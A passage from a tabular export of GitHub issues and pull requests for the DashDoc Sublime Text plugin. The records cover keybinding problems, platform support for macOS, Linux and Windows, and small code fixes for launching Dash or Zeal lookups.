When I invoke the doc search function using my custom shortcut key, DashDoc complains that it can not find the application.",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/63/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/63/comments,https://api.github.com/repos/farcaller/DashDoc/issues/63/events,https://github.com/farcaller/DashDoc/issues/63,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/62,277594730,MDU6SXNzdWUyNzc1OTQ3MzA=,62,DashDoc does not work on Sublime 3 on Ubuntu,5911945,open,FALSE,NA,NA,9,2017-11-29T01:10:07Z,2019-11-17T03:58:46Z,NA,NONE,NA,"I have set up key binding like so as per advise i nthe documentation:

`{ ""keys"": [""ctrl+h""], ""command"": ""dash_doc"", ""args"": { ""flip_syntax_sensitive"": true }}`

and it doesn't work. Do I miss anything here?",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/62/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/62/comments,https://api.github.com/repos/farcaller/DashDoc/issues/62/events,https://github.com/farcaller/DashDoc/issues/62,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/61,267894633,MDU6SXNzdWUyNjc4OTQ2MzM=,61,Page not updating,6013378,closed,FALSE,NA,NA,4,2017-10-24T04:36:20Z,2017-10-29T08:18:34Z,2017-10-29T08:18:34Z,NONE,NA,"I'm on a 2017 Macbook Pro, running macOS Sierra 10.12.6 with the latest version of Dash, and I'm having this issue:

it doesn't work.

I've used this extension before on Windows and Linux, where it works flawlessly, but on macOS, when I run the `dash_doc` command on a selected bit of text, absolutely nothing will happen if I already have Dash open. If I close Dash and try again, it'll open dash... but only to whatever page I happened to be looking at last time I closed it; it's not searching for what I typed.

I'm new to mac, so it's possible that I just don't know what I'm doing, but I've tried running through the command palette and binding a key, and frankly I don't know what I could be missing.",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/61/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/61/comments,https://api.github.com/repos/farcaller/DashDoc/issues/61/events,https://github.com/farcaller/DashDoc/issues/61,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/60,267731692,MDExOlB1bGxSZXF1ZXN0MTQ4MTc3ODY2,60,fixes my breakage of macOS systems,646398,closed,FALSE,NA,NA,3,2017-10-23T16:21:42Z,2017-10-29T08:18:05Z,2017-10-29T08:17:22Z,CONTRIBUTOR,NA,Fixes #59,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/60/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/60/comments,https://api.github.com/repos/farcaller/DashDoc/issues/60/events,https://github.com/farcaller/DashDoc/pull/60,https://api.github.com/repos/farcaller/DashDoc/pulls/60
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/59,267490168,MDU6SXNzdWUyNjc0OTAxNjg=,59,Not working on Sb3,7901366,closed,FALSE,NA,NA,7,2017-10-22T19:08:53Z,2017-10-29T08:17:22Z,2017-10-29T08:17:22Z,NONE,NA,"Hi,

The module is not working on Sublime-Text3 on Mac, I added { ""keys"": [""ctrl+d""], ""command"": ""dash_doc"" } to my keycap but it does not open at all :s ",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/59/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/59/comments,https://api.github.com/repos/farcaller/DashDoc/issues/59/events,https://github.com/farcaller/DashDoc/issues/59,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/58,267345055,MDExOlB1bGxSZXF1ZXN0MTQ3OTI0NzAw,58,fixing KDE Plasma 5 URL handling,646398,closed,FALSE,NA,NA,1,2017-10-21T02:46:58Z,2017-10-22T07:46:20Z,2017-10-22T07:46:20Z,CONTRIBUTOR,NA,"noticed dash-doc did not have proper URL handling on my KDE Plasma Linux DE... after some investigation, I found a similar issue on zeal docs here: 

https://github.com/zealdocs/zeal/issues/471

where the zeal docs author suggested getting rid of the `//` after `dash-plugin://` and all was well.

I tested this by making this modification on my system, and zeal is called up properly.  I am unable to test other linux distributions though. ",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/58/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/58/comments,https://api.github.com/repos/farcaller/DashDoc/issues/58/events,https://github.com/farcaller/DashDoc/pull/58,https://api.github.com/repos/farcaller/DashDoc/pulls/58
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/57,264966219,MDU6SXNzdWUyNjQ5NjYyMTk=,57,Hotkey for opening Dash in Sublime Text,3748128,closed,FALSE,NA,NA,4,2017-10-12T14:36:55Z,2020-02-02T20:37:56Z,2017-10-12T14:38:43Z,NONE,NA,The Hotkey Ctrl-H does not work anymore in the new version of Sublime Text (Version 3.0 Build 3143) in OSX.,NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/57/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/57/comments,https://api.github.com/repos/farcaller/DashDoc/issues/57/events,https://github.com/farcaller/DashDoc/issues/57,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/56,262784940,MDU6SXNzdWUyNjI3ODQ5NDA=,56,How to assign a custom hotkey to trigger Dash?,6391776,closed,FALSE,NA,NA,1,2017-10-04T13:21:44Z,2017-10-04T17:45:56Z,2017-10-04T17:45:56Z,NONE,NA,"I couldn't find anything in the README.

I wish I can assign `⌃ + D` to activate Dash.

Thank you for any help. ",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/56/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/56/comments,https://api.github.com/repos/farcaller/DashDoc/issues/56/events,https://github.com/farcaller/DashDoc/issues/56,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/55,262667707,MDU6SXNzdWUyNjI2Njc3MDc=,55,"Not working with latest sublime Version 3, Build 3143",835114,closed,FALSE,NA,NA,3,2017-10-04T05:18:42Z,2017-10-11T07:07:17Z,2017-10-04T17:47:36Z,NONE,NA,Missing Default key bindings.,NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/55/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/55/comments,https://api.github.com/repos/farcaller/DashDoc/issues/55/events,https://github.com/farcaller/DashDoc/issues/55,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/54,262489620,MDU6SXNzdWUyNjI0ODk2MjA=,54,URLs not being handled on KDE Plasma 5,646398,closed,FALSE,NA,NA,2,2017-10-03T16:11:29Z,2017-10-22T07:46:24Z,2017-10-22T07:46:24Z,CONTRIBUTOR,NA,"Looks like the same issue here is impacting this plugin:

https://github.com/zealdocs/zeal/issues/471


When I modified the xdg-open subprocess calls in DashDoc.py as follows, the plugin worked as intended

```python
elif platform.system() == 'Linux':
            subprocess.call(['/usr/bin/xdg-open',
                         'dash-plugin:keys=%s&query=%s%s' % (','.join(keys), quote(query), background_string)])
        else:
            subprocess.call(['/usr/bin/open', '-g',
                         'dash-plugin:keys=%s&query=%s%s' % (','.join(keys), quote(query), background_string)])
```",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/54/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/54/comments,https://api.github.com/repos/farcaller/DashDoc/issues/54/events,https://github.com/farcaller/DashDoc/issues/54,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/53,262340815,MDU6SXNzdWUyNjIzNDA4MTU=,53,After upgrading to the 2.4.0 ctrl+h stopped working,6096301,closed,FALSE,NA,NA,1,2017-10-03T08:15:48Z,2017-10-03T11:40:57Z,2017-10-03T11:40:57Z,CONTRIBUTOR,NA,After upgrading to the version 2.4.0 `ctrl+h` does not work anymore. I suppose that's because of deleting `*.sublime-keymap` files.,NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/53/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/53/comments,https://api.github.com/repos/farcaller/DashDoc/issues/53/events,https://github.com/farcaller/DashDoc/issues/53,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/52,261985208,MDU6SXNzdWUyNjE5ODUyMDg=,52,Recent versions not appearing in Package Control,6535396,closed,FALSE,NA,NA,1,2017-10-02T05:22:36Z,2017-10-02T07:47:21Z,2017-10-02T07:47:21Z,CONTRIBUTOR,NA,"The latest version available in Package Control is 1.6.0 (see [here](https://packagecontrol.io/packages/DashDoc)). 

It looks like Package Control requires version numbers with the format `x.y.z`, not just `x.y` (see [here](https://packagecontrol.io/docs/submitting_a_package#Step_4))
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/52/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/52/comments,https://api.github.com/repos/farcaller/DashDoc/issues/52/events,https://github.com/farcaller/DashDoc/issues/52,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/51,257912901,MDExOlB1bGxSZXF1ZXN0MTQxMjE4NDg3,51,"Add TypeScript keyword, update README with latest mappings",6535396,closed,FALSE,NA,NA,2,2017-09-15T02:53:31Z,2017-09-16T19:01:18Z,2017-09-16T18:59:33Z,CONTRIBUTOR,NA,"I added the TypeScript keyword, with the same values as the Javascript
keyword + ""typescript"" + ""react"".

I also updated the README to reflect the latest mappings, including this
change.",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/51/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/51/comments,https://api.github.com/repos/farcaller/DashDoc/issues/51/events,https://github.com/farcaller/DashDoc/pull/51,https://api.github.com/repos/farcaller/DashDoc/pulls/51
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/50,242747304,MDExOlB1bGxSZXF1ZXN0MTMwNDA1MTQ4,50,Added Linux support - using xdg-open,12998362,closed,FALSE,NA,NA,4,2017-07-13T15:49:58Z,2017-07-14T07:43:52Z,2017-07-14T07:43:52Z,CONTRIBUTOR,NA,This works on my Ubuntu 14.04 don't know about others,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/50/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/50/comments,https://api.github.com/repos/farcaller/DashDoc/issues/50/events,https://github.com/farcaller/DashDoc/pull/50,https://api.github.com/repos/farcaller/DashDoc/pulls/50
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/49,237866677,MDExOlB1bGxSZXF1ZXN0MTI3MDA3NzU4,49,Added support for running a Dash search in the background,12421693,closed,FALSE,NA,NA,2,2017-06-22T14:34:18Z,2017-06-23T03:40:31Z,2017-06-22T22:45:10Z,CONTRIBUTOR,NA,"These changes add support for running a Dash search in the background, without switching to Dash as the active application, keeping the focus on Sublime Text. This is useful when you're using a dual-monitor setup, or even just multiple windows side by side on a single screen, and you'd like to search while keeping your keyboard focus in the editor. 

Key bindings can be set up for the regular search and then the background search like this:

```
	{ ""keys"": [""YOUR HOTKEY""], ""command"": ""dash_doc""},
	{ ""keys"": [""YOUR HOTKEY""], ""command"": ""dash_doc"",
                               ""args"": { ""flip_syntax_sensitive"": true } },
	{ ""keys"": [""YOUR HOTKEY""], ""command"": ""dash_doc"",
                               ""args"": { ""run_in_background"": true } },
        { ""keys"": [""YOUR HOTKEY""], ""command"": ""dash_doc"",
                               ""args"": { ""flip_syntax_sensitive"": true,
                               		 ""run_in_background"": true } }
```
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/49/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/49/comments,https://api.github.com/repos/farcaller/DashDoc/issues/49/events,https://github.com/farcaller/DashDoc/pull/49,https://api.github.com/repos/farcaller/DashDoc/pulls/49
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/48,231624326,MDExOlB1bGxSZXF1ZXN0MTIyNjQxMTM4,48,Add Kotlin keyword,6559692,closed,FALSE,NA,NA,1,2017-05-26T13:18:44Z,2017-07-14T09:38:51Z,2017-07-14T09:38:51Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/48/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/48/comments,https://api.github.com/repos/farcaller/DashDoc/issues/48/events,https://github.com/farcaller/DashDoc/pull/48,https://api.github.com/repos/farcaller/DashDoc/pulls/48
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/47,229683093,MDU6SXNzdWUyMjk2ODMwOTM=,47,Thanks for this!,8212,closed,FALSE,NA,NA,1,2017-05-18T14:04:29Z,2017-05-18T22:46:42Z,2017-05-18T22:46:42Z,NONE,NA,"I just installed this package and did my first word lookup... 🔥🔥🔥

Thanks so much for making this! 💚 

_(please close this issue immediately after reading. kthxbai)_",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/47/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/47/comments,https://api.github.com/repos/farcaller/DashDoc/issues/47/events,https://github.com/farcaller/DashDoc/issues/47,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/46,213055001,MDU6SXNzdWUyMTMwNTUwMDE=,46,DashDoc package not found in Sublime Text 3,522849,closed,FALSE,NA,NA,1,2017-03-09T14:35:25Z,2017-03-09T15:48:57Z,2017-03-09T15:48:48Z,NONE,NA,Does this work in Sublime Text 3?,NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/46/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/46/comments,https://api.github.com/repos/farcaller/DashDoc/issues/46/events,https://github.com/farcaller/DashDoc/issues/46,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/45,211872040,MDU6SXNzdWUyMTE4NzIwNDA=,45,Alfred search immediately overrides the tab search,1983382,closed,FALSE,NA,NA,2,2017-03-04T10:46:21Z,2017-03-06T07:44:17Z,2017-03-05T16:41:19Z,NONE,NA,"I almost exclusively use Dash with Alfred.

When I type in a command the activatd tab in Dash gets overwritten with the new search.
This is bugging me for years now!

Suggestions:

1) Searching with Alfred opens a new tab and searchs there (Don't like this one)

2) Alfred doesn't search inside the Dash-App until I hit Enter; It then would always open a new Tab, unless I press CMD+Enter.


What do you say?",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/45/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/45/comments,https://api.github.com/repos/farcaller/DashDoc/issues/45/events,https://github.com/farcaller/DashDoc/issues/45,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/44,181203314,MDU6SXNzdWUxODEyMDMzMTQ=,44,[Feature request] Add «zeal_path» setting,17247677,open,FALSE,NA,NA,2,2016-10-05T16:27:41Z,2018-05-15T04:57:03Z,NA,NONE,NA,"### Request

Add `""zeal_path""` setting in DashDoc.
### Justification

I install Zeal Portable for Windows in `E:\Zeal folder`. But now if directory of Zeal not default I can not to use DashDoc.
### Extended behavior

Setting `""zeal_path""` in `DashDoc.sublime-settings` file. I make a value `""zeal_path"": ""E:\\Zeal""` and DashDoc works for me.
### Environment

**Operating system and version:**
Windows 10.0.14393
**Sublime Text:**
Build 3126

Thanks.
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/44/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/44/comments,https://api.github.com/repos/farcaller/DashDoc/issues/44/events,https://github.com/farcaller/DashDoc/issues/44,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/43,150436814,MDExOlB1bGxSZXF1ZXN0Njc1NTEyNTY=,43,Windows support,160467,closed,FALSE,NA,NA,3,2016-04-22T18:12:13Z,2016-04-29T09:03:45Z,2016-04-29T09:03:45Z,CONTRIBUTOR,NA,"Adds support for Windows, to work with Dash-compatible doc viewers on that platform. This is tested against the two most popular (only?) Dash-compatible Windows viewers, [Zeal](https://zealdocs.org/) and [Velocity](https://velocity.silverlakesoftware.com/).
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/43/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/43/comments,https://api.github.com/repos/farcaller/DashDoc/issues/43/events,https://github.com/farcaller/DashDoc/pull/43,https://api.github.com/repos/farcaller/DashDoc/pulls/43
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/42,122437709,MDExOlB1bGxSZXF1ZXN0NTM4MDMyOTU=,42,Create LICENSE.md,1007647,closed,FALSE,NA,NA,1,2015-12-16T06:15:40Z,2015-12-16T16:18:39Z,2015-12-16T13:32:13Z,NONE,NA,"Add an open source license.
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/42/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/42/comments,https://api.github.com/repos/farcaller/DashDoc/issues/42/events,https://github.com/farcaller/DashDoc/pull/42,https://api.github.com/repos/farcaller/DashDoc/pulls/42
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/41,115645556,MDU6SXNzdWUxMTU2NDU1NTY=,41,DashDoc Sublime text plugin for Windows,627195,closed,FALSE,NA,NA,1,2015-11-07T07:58:18Z,2015-11-07T10:17:03Z,2015-11-07T10:17:03Z,NONE,NA,"will a windows version of sublime text plugin be released?
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/41/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/41/comments,https://api.github.com/repos/farcaller/DashDoc/issues/41/events,https://github.com/farcaller/DashDoc/issues/41,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/40,86322522,MDU6SXNzdWU4NjMyMjUyMg==,40,Not in Package control,1002461,closed,FALSE,NA,NA,8,2015-06-08T20:39:16Z,2015-10-16T23:12:30Z,2015-06-09T21:47:33Z,NONE,NA,"I cant find this package in Package control, I am trying with `Dash Doc`.
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/40/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/40/comments,https://api.github.com/repos/farcaller/DashDoc/issues/40/events,https://github.com/farcaller/DashDoc/issues/40,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/39,73614135,MDExOlB1bGxSZXF1ZXN0MzQ4MTQ2Njg=,39,Update README.md,1333916,closed,FALSE,NA,NA,0,2015-05-06T13:09:44Z,2015-05-06T13:10:51Z,2015-05-06T13:10:51Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/39/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/39/comments,https://api.github.com/repos/farcaller/DashDoc/issues/39/events,https://github.com/farcaller/DashDoc/pull/39,https://api.github.com/repos/farcaller/DashDoc/pulls/39
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/38,69361962,MDU6SXNzdWU2OTM2MTk2Mg==,38,Have Dash snippets available in SublimeText,163428,closed,FALSE,NA,NA,2,2015-04-18T23:56:01Z,2015-04-19T14:05:13Z,2015-04-19T14:05:13Z,NONE,NA,"As an avid user of Dash snippets I would like to have them available in SublimeText in order to save me from manually switing to Dash, selecting the snippet in question there with the mouse, copying it, returning back to SublimeText in order to finally pasting it and then manually filling the gaps.

Ideally the Dash snippets appear in the list of snippets already available in SublimeText (as invoked by Tools: Snippets...)
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/38/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/38/comments,https://api.github.com/repos/farcaller/DashDoc/issues/38/events,https://github.com/farcaller/DashDoc/issues/38,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/37,62866367,MDU6SXNzdWU2Mjg2NjM2Nw==,37,Look up the expression/keyword under the cursor (such as background-color),329967,open,FALSE,NA,NA,0,2015-03-19T03:49:50Z,2017-12-14T15:53:34Z,NA,NONE,NA,"Thanks for DashDoc, very useful.
Not sure if this is doable, but depending on the buffer syntax, could the look up be performed on something ""larger"" than the word? For example, in a CSS file:

```
div.foo {
  background-color: #ddd;
}
```

If my cursor is on `background`, Dash looks up `background`, if my cursor is on `color`, it looks up `color`, but one would likely expect Sublime would ask Dash to look up `background-color`.

Thanks
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/37/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/37/comments,https://api.github.com/repos/farcaller/DashDoc/issues/37/events,https://github.com/farcaller/DashDoc/issues/37,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/36,61876300,MDU6SXNzdWU2MTg3NjMwMA==,36,Call Dash without activating it,1445635,closed,FALSE,NA,NA,2,2015-03-15T18:09:29Z,2015-03-15T18:48:10Z,2015-03-15T18:42:17Z,CONTRIBUTOR,NA,"DashDoc calls Dash by opening a `dash-plugin://` URL. The problem is that the system forces Dash to become active when this URL is opened.

Currently, this is not an issue. However, a future update of Dash will add support for iOS remotes. While an iOS remote is connected, extensions are redirected to it directly and Dash on OS X is not shown at all. Unfortunately there's no way for me to prevent the system from activating Dash when you open the `dash-plugin://` URL.

Instead of doing this:

```
open dash-plugin://query
```

Can you do this?

```
open -g dash-plugin://query
```

The `-g` causes Dash to not get activated if it does not want to and the user experience is a lot better as the active app does not lose focus anymore.

It is safe to make this change as soon as possible (no need to wait for a Dash update), as the current version of Dash already knows to activate itself if it needs to.
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/36/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/36/comments,https://api.github.com/repos/farcaller/DashDoc/issues/36/events,https://github.com/farcaller/DashDoc/issues/36,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/35,44302707,MDU6SXNzdWU0NDMwMjcwNw==,35,Stopped working,38916,closed,FALSE,NA,NA,4,2014-09-29T14:55:19Z,2014-10-07T11:55:45Z,2014-10-07T11:55:45Z,NONE,NA,"This was excellent until it stopped working.

I have enabled shortcut visibility in the console, and i can see the commands are being invoked, but nothing happens at all.

The normal Dash shortcut does work, but only outside of Sublime Text.

I have Yosemite latest beta, but this (non-)behaviour started in Mavericks.

Any idea what I can do to troubleshoot?

Sublime Text 3065
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/35/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/35/comments,https://api.github.com/repos/farcaller/DashDoc/issues/35/events,https://github.com/farcaller/DashDoc/issues/35,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/34,43287976,MDU6SXNzdWU0MzI4Nzk3Ng==,34,Angularjs as option inside of Javascript Syntax map,3253938,closed,FALSE,NA,NA,2,2014-09-19T22:08:05Z,2014-10-19T07:02:01Z,2014-10-19T07:02:01Z,NONE,NA,"It's easy enough to add it in user preferences, but I was curious why 'angularjs' isn't under the javascript syntax map by default? I would assume most every Angular project would have their controllers and directives inside a .js file. Just a thought. 
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/34/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/34/comments,https://api.github.com/repos/farcaller/DashDoc/issues/34/events,https://github.com/farcaller/DashDoc/issues/34,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/33,35991557,MDU6SXNzdWUzNTk5MTU1Nw==,33,Errors when running DashDoc command,835798,closed,FALSE,NA,NA,8,2014-06-18T14:35:55Z,2014-06-26T12:49:18Z,2014-06-18T16:35:21Z,NONE,NA,"When I run the DashDoc command, either through the keyboard shortcut or command palette, I get this output:

```
command: dash_doc
Traceback (most recent call last):
  File ""/Applications/Sublime Text.app/Contents/MacOS/sublime_plugin.py"", line 549, in run_
    return self.run(edit)
  File ""DashDoc in /Users/a1096681/Library/Application Support/Sublime Text 3/Installed Packages/DashDoc.sublime-package"", line 54, in run
  File ""X/subprocess.py"", line 521, in call
  File ""X/subprocess.py"", line 818, in __init__
  File ""X/subprocess.py"", line 1416, in _execute_child
FileNotFoundError: [Errno 2] No such file or directory: 'open'
```
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/33/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/33/comments,https://api.github.com/repos/farcaller/DashDoc/issues/33/events,https://github.com/farcaller/DashDoc/issues/33,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/32,34723693,MDU6SXNzdWUzNDcyMzY5Mw==,32,Issues with looking up correct language.,5455859,closed,FALSE,NA,NA,9,2014-06-01T07:59:51Z,2015-10-07T18:42:05Z,2014-06-10T10:15:53Z,NONE,NA,"So basically whenever I have my cursor over a function, I hit my keybinding to do the quick dash-lookup and instead of taking me to the PHP docs, it seems to be taking me to  either HTML5 or Bootstrap.  Any ideas what's causing this?
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/32/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/32/comments,https://api.github.com/repos/farcaller/DashDoc/issues/32/events,https://github.com/farcaller/DashDoc/issues/32,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/31,33640127,MDExOlB1bGxSZXF1ZXN0MTU5Njc0NjA=,31,Dash 2.1 keywords,1445635,closed,FALSE,NA,NA,4,2014-05-16T01:24:19Z,2014-10-19T08:49:05Z,2014-10-19T07:01:35Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/31/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/31/comments,https://api.github.com/repos/farcaller/DashDoc/issues/31/events,https://github.com/farcaller/DashDoc/pull/31,https://api.github.com/repos/farcaller/DashDoc/pulls/31
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/30,30099061,MDU6SXNzdWUzMDA5OTA2MQ==,30,ST3 Support,2934046,closed,FALSE,NA,NA,5,2014-03-25T06:03:45Z,2014-03-26T17:18:48Z,2014-03-26T17:18:48Z,NONE,NA,"any chance this is coming? I don't see it in package control.
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/30/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/30/comments,https://api.github.com/repos/farcaller/DashDoc/issues/30/events,https://github.com/farcaller/DashDoc/issues/30,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/29,29987017,MDU6SXNzdWUyOTk4NzAxNw==,29,Provide a better option for default dash hotkey,693,closed,FALSE,693,NA,12,2014-03-23T13:11:34Z,2016-11-13T11:09:09Z,2016-11-13T11:09:09Z,OWNER,NA,"Tracking bug for issue in #28.
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/29/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/29/comments,https://api.github.com/repos/farcaller/DashDoc/issues/29/events,https://github.com/farcaller/DashDoc/issues/29,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/28,29352248,MDExOlB1bGxSZXF1ZXN0MTM1MjIyODA=,28,Remap DashDoc keybindings (to avoid OS X Delete conflict),65468,closed,FALSE,NA,NA,5,2014-03-13T14:01:06Z,2014-06-16T15:04:30Z,2014-03-23T13:05:49Z,NONE,NA,"In OS X, Ctrl+h is mapped to Delete as part of the universal Emacs keybindings. This PR has new keybindings – that at the very least don’t conflict with any OSX or ST2 keybindings – that I use to maintain the Delete key while trying not making invoking DashDoc require some finger gymnastics.
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/28/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/28/comments,https://api.github.com/repos/farcaller/DashDoc/issues/28/events,https://github.com/farcaller/DashDoc/pull/28,https://api.github.com/repos/farcaller/DashDoc/pulls/28
